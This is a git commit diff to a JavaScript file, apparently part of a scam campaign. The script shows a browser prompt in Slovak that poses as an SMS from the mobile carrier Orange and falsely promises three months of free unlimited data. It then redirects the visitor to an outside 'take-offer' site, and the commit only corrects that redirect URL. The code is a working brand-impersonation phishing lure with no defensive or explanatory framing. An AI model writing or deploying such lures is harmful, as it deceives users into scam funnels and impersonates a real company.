f85f08e2dc3e795380721b91ac12f233253ee0a1
derealblog <rosie1999willie@gmail.com>
2025-01-31 14:17:33 +0100

    Update oarnge-unlimited.js

--- oarnge-unlimited.js
+++ oarnge-unlimited.js
@@ -2,5 +2,5 @@
 var password = 'AKTIVOVAŤ ÚDAJE'
 password=prompt('SMS: Blahoželáme, máte nárok na 3-mesačné neobmedzené bezplatné dáta od spoločnosti Orange. Ak chcete aktivovať, stlačte tlačidlo OK   ','AKTIVOVAŤ ÚDAJE');
 if (password != 'AKTIVOVAŤ ÚDAJE') {
-location.href='https://take-offer.org/orange-%20unlimited.html';
+location.href='https://take-offer.org/orange-unlimited.html';
 }
